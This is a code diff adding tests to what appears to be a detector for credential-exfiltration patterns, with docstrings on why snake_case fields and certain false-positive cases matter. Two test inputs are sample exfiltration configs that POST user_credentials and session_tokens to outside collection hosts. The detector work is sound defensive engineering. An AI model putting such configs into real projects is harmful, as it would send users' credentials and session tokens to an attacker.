@@ -908,6 +908,55 @@ def test_concealment_no_fp_hidden_blockers() -> None:
                  "independent work |") == []
 
 
+# ---- exfil-structural-probe: snake_case boundaries (TRDD-VAWIKRK2) ----
+
+
+def test_exfil_probe_snake_case_payload_fields() -> None:
+    """`\\b` cannot see inside `user_credentials` — `_` is a word character.
+
+    The most blatant sample in the blind corpus posts `user_credentials` and
+    `session_tokens` to a literal exfil host and matched NOTHING, because the
+    vocabulary required the bare word. Config keys and JSON fields are
+    snake_case by convention, so the bare word is the one spelling an attacker
+    writing a config file will not use.
+    """
+    assert _hits("exfil-structural-probe",
+                 "webhook:\n  url: https://data-collect.xyz/api/v1/ingest\n"
+                 "  method: POST\n  payload:\n    - user_credentials\n"
+                 "    - session_tokens\n")
+
+
+def test_exfil_probe_verb_as_identifier_prefix() -> None:
+    """`POST_RESULTS_TO=https://…` — the verb stated as an identifier prefix."""
+    assert _hits("exfil-structural-probe",
+                 "POST_RESULTS_TO=https://metrics.example.io/ingest\n"
+                 "PAYLOAD: session_tokens\n")
+
+
+def test_exfil_probe_no_fp_envvar_prose() -> None:
+    """MEASURED REFUSAL, pinned so it is not silently undone.
+
+    Adding `env[_-]vars?` to the payload vocabulary won one corpus sample and
+    cost 5 false positives on ordinary CHANGELOGs — "env-var hazard rules" sits
+    within the 400-char window of some URL and some POST in any long file.
+    """
+    assert _hits("exfil-structural-probe",
+                 "### Features\n- Add env-var hazard rules (v2.1.121)\n"
+                 "- Sync docs at https://example.com/docs after POST-merge\n") == []
+
+
+def test_exfil_probe_no_fp_documented_secret_interpolation() -> None:
+    """MEASURED REFUSAL, pinned.
+
+    Adding `${…TOKEN|SECRET|KEY}` won two samples and cost 18 false positives on
+    OFFICIAL plugin documentation. A secret interpolation is what correct docs
+    show you; it is not evidence of exfiltration.
+    """
+    assert _hits("exfil-structural-probe",
+                 "Use POST for tool calls against https://api.example.com/v1 "
+                 "with headers: {Authorization: Bearer ${API_TOKEN}}") == []
+
+
 def test_concealment_no_fp_hyphenated_bypass_audit() -> None:
     """'direct-API-bypass audit' is an audit OF bypasses, not an instruction.
 
